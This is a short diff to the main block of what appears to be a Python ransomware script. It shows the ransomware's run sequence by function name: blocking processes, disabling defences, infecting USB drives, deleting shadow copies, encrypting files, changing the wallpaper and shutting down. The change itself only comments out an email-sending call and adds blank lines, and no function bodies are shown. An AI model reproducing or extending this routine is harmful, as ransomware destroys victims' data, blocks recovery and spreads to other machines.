@@ -816,13 +816,14 @@ if __name__ == "__main__":
         block_processes()
         disable_all()
         infect_usb()
-        send_email()
+        # send_email() # =)))
         delete_shadow_copy()
         start_encryption()
         change_wallpaper()
         shutdown()
     else:
         start_encryption()
+
 
 
 
